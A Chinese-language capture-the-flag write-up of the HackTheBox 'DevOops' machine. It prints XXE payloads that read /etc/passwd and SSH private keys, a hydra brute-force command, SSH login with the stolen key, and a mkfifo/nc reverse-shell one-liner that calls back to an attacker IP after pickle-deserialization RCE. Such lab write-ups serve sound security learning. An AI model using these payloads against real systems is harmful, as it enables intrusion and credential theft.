---
title: "HackTheBox：DevOops笔记"
slug: wkoum5
date: 2020-06-06T19:19:24+08:00
source: yuque/penetration
---

Nmap

```markdown

# nmap -p- -sV -sC 10.10.10.91 -oA scans/nmap

Nmap scan report for 10.10.10.91
Host is up (0.90s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

hydra试着用kali自带的fasttrack字典爆破ssh，无果

```markdown

# hydra -l root -P /usr/share/wordlists/fasttrack.txt   ssh://10.10.10.91

[STATUS] 112.50 tries/min, 225 tries in 00:02h, 1 to do in 00:01h, 16 active
1 of 1 target completed, 0 valid passwords found
```

# 5000端口：XXE
用dirb扫描目录

i![](https://cdn.nlark.com/yuque/0/2020/png/166008/1591462087751-71ec931e-7fee-4d09-b17b-6591f8214386.png)

发现upload，提示上传XML，并且XML节点类型已知

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1591462159645-0c08aa42-d812-49d4-be68-bdf66328cf1b.png)

```markdown
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "http://10.10.14.6:8888"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&ent;</lastName>
</userInfo>
```

上传上面的payload，测试此处存在XXE

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1591462204600-8133bed2-ee66-47aa-a769-87b677523347.png)

不过这只能看出是可以带外的XXE，还要看一下是否可以回显，构造

```markdown

<?xml version="1.0"?>
  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:////etc/passwd " >
  ]>

  <foo>
    <Author>Gerh</Author>
    <Subject>BinaryChaos</Subject>
    <Content>&xxe;</Content>
  </foo>
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1591463902896-b1e14bea-581d-464d-9919-08e76eb491b9.png)  
读取user.txt，并尝试读取敏感文件，读到了`.bash_history`和私钥

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1591464385462-04f59a5b-47f3-43a9-a1fe-aabf0ca5eef0.png)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1591464106747-53578e6f-f7a2-4723-bdca-8f86faf0d9b4.png)

用密钥登录ssh

```markdown
ssh -i id_rsa roosa@10.10.10.91
```

拿到第一个shell

# 提权
提权直接用信息泄漏即可，在git的记录里找到root用户的私钥，提权到root





# 回顾
回过头去看看flask的源码

```markdown
## 读/home/roosa/deploy/src/feed.py

HTTP/1.1 200 OK
Server: gunicorn/19.7.1
Date: Sat, 06 Jun 2020 08:47:55 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 1061

 PROCESSED BLOGPOST: 
  Author: Gerh
 Subject: BinaryChaos
 Content: ')
def uploaded_file(filename):
    return send_from_directory(Config.UPLOAD_FOLDER,
                               filename)

@app.route("/")
def xss():
    return template('index.html')

@app.route("/feed")
def fakefeed():
   return send_from_directory(".","devsolita-snapshot.png")

@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']


## TODO: VERY important! DISABLED THIS IN PRODUCTION
#app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
# TODO: Replace run-gunicorn.sh with real Linux service script
# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')

if __name__ == "__main__":
  app.run(host='0.0.0,0', Debug=True)


 URL for later reference: /uploads/xxe.xml
 File path: /home/roosa/deploy/src
```

发现有pickle反序列化的点，并且无任何过滤（`base64.urlsafe_b64decode`不算过滤的）

## pickle反序列化
直接用python反序列化时自动调用的reduce方法，构造恶意参数达成RCE

一开始用python3的pickle.dumps()，出现了很多不可见字符

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1591892032915-e798f7b9-72a4-4f66-abcd-38b34d510779.png)

后面查找walkthrough，发现用python2可成功搞定，猜测是python3取消了cpickle的原因。

尝试`bash -i`和`nc -e `反弹shell，均失败



最后用下面的代码反弹shell

```markdown
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.122 1337 >/tmp/f
```



中途还因为指定了Content-Type，导致flask收不到参数，打rce失败的结果。。。



# ref
+ [https://hackingprofessional.github.io/HTB/How-to-hack-a-website-with-XML-External-Entity-Injection/](https://hackingprofessional.github.io/HTB/How-to-hack-a-website-with-XML-External-Entity-Injection/)
+ [dumping-git-data-from-misconfigured-web-servers/](https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/)
+ [https://0xdf.gitlab.io/2018/10/13/htb-devoops.html#pickle-exploit-for-user-shell](https://0xdf.gitlab.io/2018/10/13/htb-devoops.html#pickle-exploit-for-user-shell)
+ [https://zhuanlan.zhihu.com/p/89132768](https://zhuanlan.zhihu.com/p/89132768)

